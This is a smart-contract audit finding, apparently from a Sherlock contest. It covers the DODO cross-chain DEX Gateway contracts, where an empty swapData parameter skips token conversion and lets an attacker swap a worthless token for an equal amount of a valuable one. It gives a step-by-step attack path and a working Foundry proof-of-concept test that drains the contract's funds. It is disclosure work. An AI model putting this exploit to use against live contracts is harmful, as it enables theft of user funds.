# Bypassing Asset Conversion via Zero-Length `swapData`

### Summary

The `_doMixSwap` function within the [`GatewayTransferNative.sol`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L425) and [`GatewayCrossChain.sol`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L337) contracts improperly handles cases where the `swapData` parameter is an empty byte array. This allows the swap/conversion logic to be bypassed entirely. An attacker can exploit this flaw to exchange a nominal amount of a low-value token for the same amount of a high-value token held by the contract, leading to a direct theft of user funds.


### Root Cause

The core of the vulnerability lies in this code block within the `_doMixSwap` function present in both  [`GatewayTransferNative.sol`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L425) and [`GatewayCrossChain.sol`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L337):

```solidity
function _doMixSwap(
    bytes memory swapData, 
    uint256 amount, 
    MixSwapParams memory params
) internal returns (uint256 outputAmount) {
    if (swapData.length == 0) {
        return amount;
    }
    // ... swap logic ...
}
```

This logic is intended to handle scenarios where no token swap is required. However, it fails to validate that if `swapData` is empty, the source token (`params.fromToken`) and destination token (`params.toToken`) must be the same. This oversight creates a loophole where the function returns the original `amount` even when a token conversion between two different assets is expected, effectively skipping the swap.

### Attack Path

An attacker can execute the exploit by crafting a malicious cross-chain message that is processed by the `onCall` function (or a similar call path in `withdrawToNativeChain`).

1.  **Preparation**: The attacker identifies a valuable token (e.g., `USDC.zrc20`) for which the contract holds a significant balance from legitimate user deposits.
2.  **Craft Malicious Message**: The attacker initiates a cross-chain transaction from a connected chain, sending a minimal amount of a worthless or attacker-controlled token (`JUNK.zrc20`). The key is the `message` payload they construct for the `onCall` function:
    *   The `zrc20` parameter is `JUNK.zrc20`.
    *   The decoded `targetZRC20` is `USDC.zrc20`.
    *   The decoded `swapData` is an empty byte array (`0x`).
3.  **Execution in `onCall`**:
    *   The `onCall` function receives the call from the gateway. It sees that the input token (`JUNK.zrc20`) is different from the `targetZRC20` (`USDC.zrc20`).
    *   This directs the control flow to the `else` block, which is meant to handle swaps.
    *   The function calls `_doMixSwap` with the empty `swapData`.
4.  **Exploitation in `_doMixSwap`**:
    *   `_doMixSwap` executes the `if (swapData.length == 0)` check. The condition is true.
    *   The function immediately executes `return amount;`, returning the original input amount without performing any swap on the DODO router.
5.  **Fund Transfer**:
    *   Back in `onCall`, the returned `outputAmount` is now equal to the input `amount`.
    *   The contract then proceeds to transfer `outputAmount` of the `targetZRC20` (`USDC.zrc20`) to the attacker's designated address.
6.  **Result**: The attacker has successfully exchanged a tiny amount of `JUNK.zrc20` for the same numerical amount of `USDC.zrc20`, effectively stealing funds from the contract.


### Impact

This vulnerability can lead to the **direct loss of all user funds** held by the `GatewayTransferNative.sol` and `GatewayCrossChain.sol` contracts. An attacker can systematically drain the contracts of any ZRC20 tokens that have a non-zero balance.

### PoC

The PoC demonstrates how an attacker can exploit the `_doMixSwap` function in `GatewayTransferNative.sol` to steal valuable tokens from the contract by sending worthless tokens and bypassing the intended swap mechanism.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {IZRC20} from "@zetachain/protocol-contracts/contracts/zevm/interfaces/IZRC20.sol";
import "@zetachain/protocol-contracts/contracts/zevm/interfaces/IGatewayZEVM.sol";
import {UniswapV2Library} from "../contracts/libraries/UniswapV2Library.sol";
import {BaseTest} from "./BaseTest.t.sol";
import {console} from "forge-std/console.sol";

/* forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public */
contract GatewayTransferNativePOCTest is BaseTest {
    
    function test_PoC_BypassSwapAndStealFunds() public {
        // ### SETUP ###
        // Attacker: user1
        // Valuable Token: token1Z (e.g. USDC.z)
        // Worthless Token: token2Z (e.g. JUNK.z)
        address valuableToken = address(token1Z);
        address worthlessToken = address(token2Z);
        address attacker = user1;

        // 1. Fund the contract with a large amount of the valuable token to simulate user deposits.
        uint256 contractValuableTokenAmount = 1_000_000 ether;
        token1Z.mint(address(gatewayTransferNative), contractValuableTokenAmount);
        deal(address(token1Z), attacker, 0 ether);
        
        // 2. Record initial balances.
        uint256 contractInitialBalance = token1Z.balanceOf(address(gatewayTransferNative));
        uint256 attackerInitialBalance = token1Z.balanceOf(attacker);

        assertEq(contractInitialBalance, contractValuableTokenAmount);
        assertEq(attackerInitialBalance, 0);

        // ### ATTACK ###

        // 3. Craft the malicious payload for `onCall`.
        bytes32 externalId = keccak256(abi.encodePacked("poc-exploit-id"));
        address targetZRC20 = valuableToken; // The valuable token we want to steal
        bytes memory sender = abi.encodePacked(attacker);
        bytes memory receiver = abi.encodePacked(attacker);

        // The key to the exploit: swapData is empty, causing _doMixSwap to return the input amount
        bytes memory swapDataZ = "";

        // Create the native message for onCall
        bytes memory nativeMessage = encodeNativeMessage(
            targetZRC20,
            sender,
            receiver,
            swapDataZ
        );

        // Define the amount the attacker wants to steal
        uint256 attackAmount = 100_000 ether;

        // 4. Simulate the gateway calling `onCall` with the worthless token as input
        // but targeting the valuable token as output
        token2Z.mint(address(gatewayTransferNative), attackAmount);

        vm.prank(address(gatewayZEVM));
        gatewayTransferNative.onCall(
            MessageContext({
                origin: "",
                sender: address(gatewayZEVM),
                chainID: 1 // Any origin chain ID
            }),
            worthlessToken, // Input: worthless token
            attackAmount,
            bytes.concat(externalId, nativeMessage)
        );

        // ### VERIFICATION ###

        // 5. Check the final balances.
        uint256 feePercent = gatewayTransferNative.feePercent();
        uint256 platformFeesForTx = (attackAmount * feePercent) / 1000;

        uint256 contractFinalBalance = token1Z.balanceOf(address(gatewayTransferNative));
        uint256 attackerFinalBalance = token1Z.balanceOf(attacker);
        uint256 treasuryBalance = token2Z.balanceOf(EddyTreasurySafe);

        // The attacker receives the full `attackAmount` of the valuable token
        // minus the platform fee (which is paid from the worthless token)
        uint256 expectedStolenAmount = attackAmount;
        assertEq(attackerFinalBalance, attackerInitialBalance + expectedStolenAmount, "Attacker should have stolen funds");
        assertEq(contractFinalBalance, contractInitialBalance - expectedStolenAmount, "Contract funds should have been stolen");

        // The fee is paid from the contract's holding of the worthless token
        assertEq(treasuryBalance, platformFeesForTx, "Treasury should have received the fee");
    }
}
```

### Mitigation

Add a validation check in the `_doMixSwap` function to ensure that empty `swapData` is only allowed when no token conversion is needed.
